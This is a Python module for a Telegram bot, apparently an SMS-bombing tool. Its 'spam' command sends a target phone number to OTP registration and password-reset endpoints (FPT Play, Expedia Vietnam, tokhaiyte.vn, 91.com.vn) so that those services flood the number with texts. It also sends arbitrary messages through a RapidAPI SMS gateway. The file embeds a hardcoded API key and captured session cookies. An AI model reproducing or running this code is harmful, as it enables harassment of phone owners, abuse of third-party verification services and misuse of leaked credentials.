#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# https://rapidapi.com/etcloud-sms-xalpha/api/sms-international

import requests
import json
import config
from telegram import Update
from telegram.ext import CallbackContext

ID = config.ID
TOKEN = config.TOKEN
host = "https://api.telegram.org/bot"+TOKEN

def fptplay(phone): #phone = 0943687522
	link = "https://api.fptplay.net/api/v6.2_w/user/otp/register_otp?st=gZKu_qCnB0pq9gKqnkW8gA&e=1597810764600&device=Firefox(version:68)"
	json = {"phone":"","country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8","st":"gZKu_qCnB0pq9gKqnkW8gA","e":1597810764600}
	json["phone"] = phone
	data = requests.post(link,json=json).json()
	if data["error_code"] == 4: # is already exist
		link = "https://api.fptplay.net/api/v6.2_w/user/otp/reset_password_otp?st=MUQMNlHQAgm9f6pblqsp1A&e=1597810825600&device=Firefox(version:68)"
		json = {"phone":"","country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8","st":"MUQMNlHQAgm9f6pblqsp1A","e":1597810825600}
		json["phone"] = phone
		data = requests.post(link, json=json).json()
		if data["error_code"] in [22,21]:
			return(data["msg"]) #22: Too many requests in a period time. Wait until next (x) seconds
			#21: Try to request after (x) seconds
			exit()
		elif data["error_code"] == 0: #gui sms thanh cong
			return("Send SMS to phone number {0} successfully".format(phone))
			exit()
		else:
			return(data,"Please capture your screen and send it to Admin... Sorry about this error!")
			exit()

	elif data["error_code"] == 0: #dang ki thanh cong
		return("Send SMS to phone number {0} successfully".format(phone))
		exit()
	elif data["error_code"] in [22,2,21]:
		return(data["msg"]) #22: Too many requests in a period time. Wait until next (x) seconds
		#2: Invalid phone number
		#21: Try to request after (x) seconds
		exit()
	else:
		return(data,"Please capture your screen and send it to admin... Sorry about this error!")
		exit()


def expedia(phone): #phone = 0943687522
	link = "https://www.expedia.com.vn/T2DGenProxy?serviceID=TXT_MOBILEAPP_LINK"
	headers = {
		"Host": "www.expedia.com.vn",
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/68.0",
		"X-Requested-With": "XMLHttpRequest",
		"Cookie": "JSESSION=815e61dc-0066-4e8f-9fa7-ee90ca91bb6; CRQS=t|71`s|71`l|vi_VN`c|VND; CRQSS=e|0; tpid=v.1,71; iEAPID=0; linfo=v.4,|0|0|255|1|0||||||||1066|0|0||0|0|0|-1|-1; currency=VND; HMS=7110dd97-3b25-4ecb-9f1b-e51302d906cf; MC1=GUID=dfadeb62949449e8972daee73881daa8; DUAID=dfadeb62-9494-49e8-972d-aee73881daa8; MC1=GUID=dfadeb62949449e8972daee73881daa8; DUAID=dfadeb62-9494-49e8-972d-aee73881daa8; MC1=GUID=dfadeb62949449e8972daee73881daa8; DUAID=dfadeb62-9494-49e8-972d-aee73881daa8; ak_bmsc=4E4F5768687D874717ABCA5F90DFB11371ABE76A9E120000F9433D5FCAD3864B~plHDEc1yaZW50ZCY9x6ymXMzA0FUK02yWry7evurceWcGHaAFffEfhzNHAiURAUwqmwUQAgVcUibdUlozLco3J9wSr/gIde+T0Jn87Q4rBopHTpbGRmb76XUlCyoS8Qe8xeNJeTMuIpb8uh2DimXEyynH7nIeFkBW2vWvPPnmEBIJWrqGTwhK9ihCBrTwg+sHMaSuCfCOKO5edO/02F9ab3Zg87gkpuW4bJgi7KDMGjzw=; JSESSIONID=A9D168750AA01E80EED898CA92198896; cesc=%7B%22marketingClick%22%3A%5B%22false%22%2C1597850671837%5D%2C%22hitNumber%22%3A%5B%228%22%2C1597850671837%5D%2C%22visitNumber%22%3A%5B%221%22%2C1597850624661%5D%2C%22entryPage%22%3A%5B%22page.404-Not-Found%22%2C1597850671837%5D%7D; aspp=v.1,0|||||||||||||; pwa_csrf=402962a0-1b2b-4cba-9168-79c5e0fb4116|nW1QVFU15D_N1WBsHI9atEC8AGsI0bgnTiC5pQzx4Ki6edO6qea9VylIfsDoK9NAfWFkOG7GH_pQgOvilO4rnA; AMCV_C00802BE5330A8350A490D4C%40AdobeOrg=1585540135%7CMCIDTS%7C18494%7CMCMID%7C24672063232123212010771061176072798171%7CMCAID%7CNONE%7CMCOPTOUT-1597857734s%7CNONE%7CvVersion%7C4.4.0; AMCVS_C00802BE5330A8350A490D4C%40AdobeOrg=1"
			}
	data = {
		"mobile_phone": "",
		"data_app": "app_66",
		"country_calling_code": 1,
		# "page_name": "unknown"
		"page_name": "Hacked"
	}
	data["mobile_phone"] = phone
	res = requests.post(link,data=data, headers = headers)
	return(res, res.text)


def tokhaiyte(phone): #phone = 0943687522
	link = "https://tokhaiyte.vn/api/Member/User/checkLogin"
	data = {"username" : ""}
	data["username"] = phone
	res = requests.post(link, data=data)
	return(res,res.text)

def _91comvn(phone): #phone = 0943687522
	link = "https://91.com.vn:29119"

	data = {
		"api":"reg_ver_3",
		"gender":0,
		"bir":"19991510",
		"user_name":"Bao Nhi",
		"application_version":"4",
		"applicaton_type":4,
		"device_type":2,
		"device_id":"Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
		"os_version":"Linux x86_64",
		"device_name":"Web",
		"source":"SMS",
		"phone_number":""
		}
	data["phone_number"] = phone 
	res = requests.post(link, json = data)
	return(res,res.text)

def sms(phone,msg):
	url = "https://sms-international.p.rapidapi.com/WebTool/SMStoCountry/sms84"
	querystring = {"phonenum":"","msg":""}
	querystring["msg"] = msg
	querystring["phonenum"] = "84"+phone[1:]
	headers = {
	    'x-rapidapi-host': "sms-international.p.rapidapi.com",
	    'x-rapidapi-key': "0cc733e278mshc6dfccfbf2203f6p16914djsnc108e3d901f5"
	    }
	response = requests.request("GET", url, headers=headers, params=querystring)
	result = response.json()["msg"].split("|")[0]
	data = "{0}\n{1}\n{2}\n".format(phone,msg,result)
	return(data)

def spam(message):
	temp = message
	message = message.split(" ")
	phone = message[1]
	if len(message) == 2:
		msg = fptplay(phone)
	elif len(message) > 2:
		text = temp[len(phone)+7:]
		msg = sms(phone,text)
	else:
		msg = "Cú pháp: .spam <sđt> <text>"
	return(msg)